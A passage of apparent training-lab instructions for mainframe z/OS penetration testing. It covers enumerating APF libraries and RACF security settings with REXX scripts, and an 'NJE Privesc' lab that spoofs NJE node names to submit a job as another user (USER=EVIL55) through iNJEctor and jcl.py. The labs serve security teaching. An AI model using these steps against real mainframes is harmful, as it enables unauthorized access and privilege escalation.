-
-There are multiple ways to list the APF Authorized Libraries:
-
-* Use the script `EVIL.REXX(APF)`: `EX 'EVIL.REXX(APF)'`
-* Use the script `ENUM` in the `Labs/Tools/Enumeration` folder
-** Upload `ENUM` to your REXX library
-** execute it with `EX '&lt;userid&gt;.REXXLIB(ENUM)' 'APF'`
-
-!!''List out z/OS SETROPTS''
-* Try running the `SETROPTS LIST` command in TSO
-** It failed due to access rights!
-* Upload the script `ENUM` in the `Labs/Tools/Enumeration` folder to either a dataset or Unix
-* Using the script list out the security settings
-** `EX '&lt;userid&gt;.REXXLIB(ENUM)' 'SEC'`
-** `./ENUM SEC`
-
-!!''Search the Dataset Class''
-* Use the RACF search command to find interesting rules
-* Command: `search class(dataset) filter(**) nomask`
-** Can you use `LD` to get the permissions for rules that have a `(G)`?
-
-!!''Dataset Concatenation''
-* Upload the script `SYS0WN` in the `Labs/Tools/Enumeration` folder to a dataset
-* Execute the script `EX '&lt;userid&gt;.REXXLIB(SYS0WN)'`
-* Do you have better than read to any of these?</pre>
-</div>
-<div created="20190515034456720" modified="20191105161724776" tags="" title="Lab 7 - NJE Privesc">
-<pre>!!''Lab Objectives''
-# Use njelib to connect and submit a job
-# Identify OHOST and RHOST
-
-We've setup an insecure NJE connection on port 175
-
-* The //ohost// is ''CLASS''
-* The //rhost// is ''EVIL''
-
-!!''Display Jes2 Information''
-* go to `Labs/Tools/NJElib`
-* Install bitstring: `pip install bitstring`
-* run iNJEctor replacing `&lt;rhost&gt;` and `&lt;ohost&gt;` with the values above: `./iNJEctor.py evilmf &lt;ohost&gt; &lt;rhost&gt;  \$djes2`
-* Enable debugging if you want to see the NJE protocol in detail by adding `-d` before the ohost
-* ''NOTE'' if it fails keep trying, only one person can connect at a time
-* More command here: https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.3.0/com.ibm.zos.v2r3.hasa200/has2cmdr.htm
-** ''WARNING'' only use $D commands
-
-!!''Submit a job''
-* Edit the JCL `nop.jcl` in the folder `Labs/Tools/NJElib/JCL`
-* Replace `NEWYORK` with `EVIL`
-* Replace `NOTIFY=&amp;SYSUID` with `NOTIFY=&lt;your userid&gt;,USER=EVIL55`
-* run `jcl.py`: `./jcl.py CLASS EVIL evilmf JCL/nop.jcl EVIL55`
 
 </pre>
 </div>
